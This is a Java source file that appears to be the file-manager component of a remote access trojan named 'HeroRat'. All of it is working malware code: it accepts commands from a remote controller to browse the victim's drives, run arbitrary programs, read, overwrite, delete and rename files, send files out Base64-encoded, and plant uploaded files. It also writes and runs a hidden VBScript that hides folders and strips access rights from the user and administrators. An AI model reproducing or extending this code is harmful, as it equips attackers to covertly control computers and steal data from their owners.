package net.herorat.features.file;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.InputStreamReader;

import javax.swing.filechooser.FileSystemView;

import net.herorat.network.Packet;
import net.herorat.network.Packet6File;
import net.herorat.utils.Base64;


public class File
{
	public static String current_path;
	
	static
	{
		try
		{
			current_path = File.class.getProtectionDomain().getCodeSource().getLocation().getPath();
			current_path = current_path.startsWith("/") ? current_path.substring(1) : current_path;
			current_path = current_path.substring(0, current_path.lastIndexOf("/") > 0 ? current_path.lastIndexOf("/") + 1 : current_path.length());
			current_path = current_path.replace("%20", " ");
		}
		catch (Exception e) {}
	}
	
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		Packet p;
		if (args.length == 1 && args[0].equals("path"))
		{
			p = new Packet6File(outputstream, new String[] { "path", path() });
			p.write();
		}
		else if (args.length == 1 && args[0].equals("root"))
		{
			p = new Packet6File(outputstream, new String[] { "roots", root() });
			p.write();
		}
		else if (args.length == 2 && args[0].equals("cd"))
		{
			p = new Packet6File(outputstream, new String[] { "files", cd(args[1]) });
			p.write();
		}
		else if (args.length == 2 && args[0].equals("exec"))
		{
			exec(args[1]);
		}
		else if (args.length == 2 && args[0].equals("edit"))
		{
			p = new Packet6File(outputstream, new String[] { "edit", args[1], edit(args[1]) });
			p.write();
		}
		else if (args.length > 2 && args[0].equals("save"))
		{
			save(args[1], args);
		}
		else if (args.length == 2 && args[0].equals("delete"))
		{
			delete(args[1]);
		}
		else if (args.length == 3 && args[0].equals("rename"))
		{
			rename(args[1], args[2]);
		}
		else if (args.length == 2 && args[0].equals("lock"))
		{
			lock(args[1]);
		}
		else if (args.length == 2 && args[0].equals("unlock"))
		{
			unlock(args[1]);
		}
		else if (args.length == 3 && args[0].equals("chmod"))
		{
			chmod(args[1], args[2]);
		}
		else if (args.length == 3 && args[0].equals("download"))
		{
			p = new Packet6File(outputstream, new String[] { "download", args[2], download(args[1]) });
			p.write();
		}
		else if (args.length == 1 && args[0].equals("upload"))
		{
			upload(args[1], args);
		}
	}
	
	public static String path()
	{
		return current_path.replace("%20", " ");
	}
	
	public static String root()
	{
		StringBuffer buffer = new StringBuffer();
		FileSystemView fsv = FileSystemView.getFileSystemView();
		for (java.io.File file : java.io.File.listRoots())
		{
			buffer.append(file + "===" + fsv.getSystemDisplayName(file) + "###");
		}
		return buffer.toString();
	}
	
	public static String cd(String path)
	{
		if (path.equals("")) path = current_path;
		else
		{
			String test = path + (path.endsWith("/") ? "" : "/");
			if (new java.io.File(test).exists())
			{
				current_path = test;
			}
		}
		
		StringBuffer buffer = new StringBuffer();
		java.io.File dir = new java.io.File(path);
		java.io.File[] children = dir.listFiles();
		for (java.io.File child : children)
		{
			if (child.isDirectory())
			{
				buffer.append("DIR_" + child.getName() + "###");
			}
			else
			{
				buffer.append("FILE_" + child.getName() + "===" + child.length() + "###");
			}
		}
		return buffer.toString();
	}
	
	public static boolean exec(final String file)
	{
		Thread t = new Thread()
		{
			public void run()
			{
				try
				{
					Runtime.getRuntime().exec(file);
				}
				catch (Exception e) {}
			}
		};
		t.start();
		return true;
	}
	
	public static String edit(String file)
	{
		try
		{			
			FileInputStream fstream = new FileInputStream(file);
			DataInputStream in = new DataInputStream(fstream);
			BufferedReader br = new BufferedReader(new InputStreamReader(in));
			StringBuffer buffer = new StringBuffer();
			String line;
			while ((line = br.readLine()) != null)
			{
				buffer.append(line + "\n");
			}
			in.close();

			return buffer.toString();
		}
		catch (Exception e) {}
		
		return "";
	}
	
	public static boolean save(String file, String[] args)
	{
		try
		{
			FileWriter fstream = new FileWriter(file);
			BufferedWriter out = new BufferedWriter(fstream);
			
			for (int i=2; i<args.length; i++)
			{
				out.write(args[i]);
			}

			out.close();
			
			return true;
		}
		catch (Exception e) {}
		return false;
	}
	
	public static boolean delete(String file)
	{
		java.io.File fileToDelete = new java.io.File(file);
		return fileToDelete.delete();
	}
	
	public static boolean rename(String file, String name)
	{
		name = current_path + name;
		java.io.File old_file = new java.io.File(file);
		java.io.File new_file = new java.io.File(name);
		return old_file.renameTo(new_file);
	}
	
	public static boolean lock(String path)
	{
		try
		{
			java.io.File file = java.io.File.createTempFile("realhowto", ".vbs");
			FileWriter fw = new FileWriter(file);
			
			StringBuffer buffer = new StringBuffer();
			buffer.append("Set WshNetwork = CreateObject(\"WScript.Network\")\n");
			buffer.append("NomMachine = WshNetwork.ComputerName\n");
			buffer.append("NomUtilisateur = WshNetwork.UserName\n");
			buffer.append("Set objShell = CreateObject(\"Wscript.Shell\")\n");
			buffer.append("Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n");
			buffer.append("If objFSO.FolderExists(\"" + path +"\") Then\n");
			buffer.append("Command1 = \"%COMSPEC% /c attrib +s +h +r " + path + "\"\n");
			buffer.append("Command2 = \"%COMSPEC% /c Echo o| cacls " + path + " /p \" & qq(NomMachine) & \":n \" & qq(NomUtilisateur) & \":n administrators:n users:n\"\n");
			buffer.append("Result1 = objShell.Run(Command1, 0, True)\n");
			buffer.append("Result2 = objShell.Run(Command2, 0, True)\n");
			buffer.append("end if");		
			
			fw.write(buffer.toString());
	        fw.close();
	        Process process = Runtime.getRuntime().exec("cscript //NoLogo " + file.getPath());
			process.waitFor();
			file.delete();
			
			return true;
		}
		catch (Exception e) {}
		
		return false;
	}
	
	public static boolean unlock(String path)
	{
		try
		{
			java.io.File file = java.io.File.createTempFile("realhowto", ".vbs");
			FileWriter fw = new FileWriter(file);
			
			StringBuffer buffer = new StringBuffer();
			buffer.append("Set WshNetwork = CreateObject(\"WScript.Network\")\n");
			buffer.append("NomMachine = WshNetwork.ComputerName\n");
			buffer.append("NomUtilisateur = WshNetwork.UserName\n");
			buffer.append("Set objShell = CreateObject(\"Wscript.Shell\")\n");
			buffer.append("Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n");
			buffer.append("If objFSO.FolderExists(\"" + path +"\") Then\n");
			buffer.append("Command1 = \"%COMSPEC% /c Echo o| cacls " + path + " /g \" & qq(NomMachine) & \":f \" & qq(NomUtilisateur) & \":f administrators:f users:f\"\n");
			buffer.append("Command2 = \"%COMSPEC% /c attrib -s -h -r " + path + "\"\n");
			buffer.append("Result1 = objShell.Run(Command1, 0, True)\n");
			buffer.append("Result2 = objShell.Run(Command2, 0, True)\n");
			buffer.append("end if");		
			
			fw.write(buffer.toString());
	        fw.close();
	        Process process = Runtime.getRuntime().exec("cscript //NoLogo " + file.getPath());
			process.waitFor();
			file.delete();
			
			return true;
		}
		catch (Exception e) {}
		
		return false;
	}
	
	public static boolean chmod(String file, String chmod)
	{
		try
		{
			String os = System.getProperty("os.name", "").toLowerCase();
			if (os.contains("mac"))
				Runtime.getRuntime().exec(new String[] { "chmod", chmod, file }).waitFor();
			else if (os.contains("nux"))
				Runtime.getRuntime().exec(new String[] { "chmod", chmod, file }).waitFor();
				
			return true;
		}
		catch (Exception e) {}
		return false;
	}
	
	public static String download(String file_org)
	{
		try
		{
			java.io.File file = new java.io.File(file_org);
			if (file.exists())
			{
				byte [] fileBytes  = new byte [(int)file.length()];
				FileInputStream fis = new FileInputStream(file);
				BufferedInputStream bis = new BufferedInputStream(fis);
				bis.read(fileBytes, 0, fileBytes.length);
				
				return Base64.encode(fileBytes);
			}
		}
		catch (Exception e) {}
		return "";
	}
	
	public static void upload(String file, String[] args)
	{
		System.out.println("SIze: " + args.length);
		System.out.println("path: " + current_path + file);
		
		try
		{
			StringBuffer buffer = new StringBuffer();
			for (int i=2; i<args.length; i++)
			{
				buffer.append(args[i]);
			}
			
			byte [] fileBytes  = Base64.decode(buffer.toString());
			java.io.File fileToSave = new java.io.File(current_path + file);
			FileOutputStream fos = new FileOutputStream(fileToSave);
			BufferedOutputStream bos = new BufferedOutputStream(fos);
			bos.write(fileBytes, 0 , fileBytes.length);
			bos.flush();
			bos.close();
		}
		catch (Exception e) {}
	}
}